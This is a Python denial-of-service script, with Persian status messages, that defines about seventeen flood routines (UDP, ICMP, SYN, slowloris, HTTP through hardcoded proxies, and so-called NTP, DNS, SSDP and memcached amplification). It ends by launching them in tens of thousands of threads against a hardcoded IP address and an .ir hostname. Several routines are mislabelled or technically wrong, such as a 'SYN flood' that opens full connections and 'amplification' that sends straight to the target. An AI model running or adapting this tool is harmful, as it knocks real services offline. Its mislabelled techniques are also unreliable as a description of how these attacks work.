import socket
import threading
import random
import time
import requests
import ssl
from random import choice
import http.client

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (مثل Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Edge/91.0.864.67",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (مثل Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (مثل Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (مثل Gecko) Version/13.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Edge/92.0.902.62",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (مثل Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (مثل Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (مثل Gecko) Version/12.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (مثل Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36"

]


PROXIES = [
    "http://162.241.207.217:80",
    "http://74.48.78.52:80",
]

def get_random_proxy():
    return choice(PROXIES)

def random_sleep(min_time=0.001, max_time=0.002):
    time.sleep(random.uniform(min_time, max_time))

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        data = random._urandom(random.randint(128, 1024))
        sock.sendto(data, (target_ip, target_port))
        print(f"حمله UDP: ارسال بسته به {target_ip}:{target_port}")
        random_sleep()

def http2_flood(target_ip, target_port):
    while True:
        try:
            proxy = get_random_proxy()
            headers = {
                "User-Agent": choice(USER_AGENTS),
                "Connection": "keep-alive",
            }
            response = requests.get(f"https://{target_ip}:{target_port}", headers=headers, proxies={"https": proxy})
            print(f"HTTP/2 request to {target_ip}:{target_port}, status code: {response.status_code} via proxy: {proxy}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def websocket_flood(target_ip, target_port):
    while True:
        try:
            proxy = get_random_proxy()
            headers = {
                "User-Agent": choice(USER_AGENTS)
            }
            response = requests.get(f"https://{target_ip}:{target_port}", headers=headers, proxies={"https": proxy})
            if response.status_code == 101:
                print(f"WebSocket connection to {target_ip}:{target_port} via proxy: {proxy}")
            random_sleep()
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
            random_sleep()

def tls_flood(target_ip, target_port):
    while True:
        try:
            proxy = get_random_proxy()
            proxy_host, proxy_port = proxy.split("//")[1].split(":")
            context = ssl.create_default_context()
            with socket.create_connection((proxy_host, int(proxy_port))) as sock:
                with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                    ssock.connect((target_ip, target_port))
                    print(f"TLS handshake with {target_ip}:{target_port} via proxy: {proxy}")
                    random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def sctp_flood(target_ip, target_port):
    while True:
        try:
            proxy = get_random_proxy()
            proxy_host, proxy_port = proxy.split("//")[1].split(":")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((proxy_host, int(proxy_port)))
            data = random._urandom(random.randint(128, 1024))
            sock.sendall(data)
            print(f"SCTP Flood: ارسال بسته به {target_ip}:{target_port} via proxy: {proxy}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()
        finally:
            sock.close()

def dns_tunneling(target_ip):
    while True:
        try:
            proxy = get_random_proxy()
            hostname = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + f".{target_ip}"
            socket.gethostbyname(hostname)
            print(f"DNS Tunneling: درخواست DNS به {hostname} via proxy: {proxy}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def icmp_flood(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while True:
        packet = random._urandom(random.randint(1024, 12800))
        sock.sendto(packet, (target_ip, 0))
        print(f"حمله ICMP: ارسال بسته به {target_ip}")
        random_sleep()

def ntp_amplification(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b'\x17\x00\x03\x2a' + b'\x00' * 4
            sock.sendto(data, (target_ip, 123))
            print(f"NTP Amplification: ارسال به {target_ip}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def ssdp_attack(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b'M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMan:"ssdp:discover"\r\nMX:3\r\n\r\n'
            sock.sendto(data, (target_ip, 1900))
            print(f"SSDP Attack: ارسال به {target_ip}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def syn_flood(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(random._urandom(1024), (target_ip, target_port))
            print(f"TCP SYN Flood: ارسال SYN به {target_ip}:{target_port}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def dns_amplification(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            sock.sendto(data, (target_ip, 53))
            print(f"DNS Amplification: ارسال به {target_ip}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def syn_ack_flood(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(random._urandom(1024), (target_ip, target_port))
            print(f"SYN-ACK Flood: ارسال SYN-ACK به {target_ip}:{target_port}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def slowloris(target_ip, target_port):
    while True:
        try:
            headers = {
                "User-Agent": choice(USER_AGENTS),
                "Connection": "keep-alive",
            }
            conn = http.client.HTTPConnection(target_ip, target_port)
            conn.putrequest("GET", "/")
            conn.putheader("Host", target_ip)
            conn.putheader("User-Agent", choice(USER_AGENTS))
            conn.putheader("Connection", "keep-alive")
            conn.endheaders()
            while True:
                time.sleep(15)
                conn.send(b"X-a: b\r\n")
                print(f"Slowloris: ارسال درخواست HTTP ناقص به {target_ip}:{target_port}")
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def udp_amplification(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(random.randint(10000, 20000))
            sock.sendto(data, (target_ip, target_port))
            print(f"UDP Amplification: ارسال به {target_ip}:{target_port}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def fragmentation_attack(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(random.randint(128, 1024))
            sock.sendto(data, (target_ip, target_port))
            print(f"Fragmentation Attack: ارسال بسته‌های شکسته شده به {target_ip}:{target_port}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def application_layer_attack(target_ip, target_port):
    while True:
        try:
            headers = {
                "User-Agent": choice(USER_AGENTS),
                "Connection": "keep-alive",
            }
            response = requests.get(f"http://{target_ip}:{target_port}", headers=headers)
            print(f"Application Layer Attack: ارسال درخواست به {target_ip}:{target_port}, status code: {response.status_code}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def memcached_ddos(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00get keys\n'
            sock.sendto(data, (target_ip, 11211))
            print(f"Memcached DDoS: ارسال به {target_ip}")
            random_sleep()
        except Exception as e:
            print(f"An error occurred: {e}")
            random_sleep()

def start_combined_attack(target_ip, target_port, hostname, num_threads):
    threads = []

    for _ in range(num_threads):
        threads.append(threading.Thread(target=udp_flood, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=http2_flood, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=websocket_flood, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=tls_flood, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=sctp_flood, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=dns_tunneling, args=(hostname,)))
        threads.append(threading.Thread(target=icmp_flood, args=(target_ip,)))
        threads.append(threading.Thread(target=ntp_amplification, args=(target_ip,)))
        threads.append(threading.Thread(target=ssdp_attack, args=(target_ip,)))
        threads.append(threading.Thread(target=syn_flood, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=dns_amplification, args=(target_ip,)))
        threads.append(threading.Thread(target=syn_ack_flood, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=slowloris, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=udp_amplification, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=fragmentation_attack, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=application_layer_attack, args=(target_ip, target_port)))
        threads.append(threading.Thread(target=memcached_ddos, args=(target_ip,)))

    # راه‌اندازی و پیوستن به نخ‌ها
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

target_ip = "185.89.22.158"
target_port = 80
hostname = "surprise.ir"
num_threads = 25562

start_combined_attack(target_ip, target_port, hostname, num_threads)
